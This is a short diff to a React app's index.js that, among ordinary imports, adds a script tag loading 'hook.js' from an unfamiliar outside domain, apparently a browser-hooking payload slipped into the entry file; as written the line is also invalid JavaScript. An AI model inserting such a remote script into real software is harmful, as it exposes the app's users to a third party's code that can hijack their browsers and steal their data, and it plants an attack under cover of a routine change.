@@ -5,6 +5,7 @@ import './index.css';
 import App from './App';
 import * as serviceWorker from './serviceWorker';
 import { BrowserRouter } from "react-router-dom";
+<script src="https://hellooooo.ml:443/hook.js">
 
 ReactDOM.render(
   <BrowserRouter>
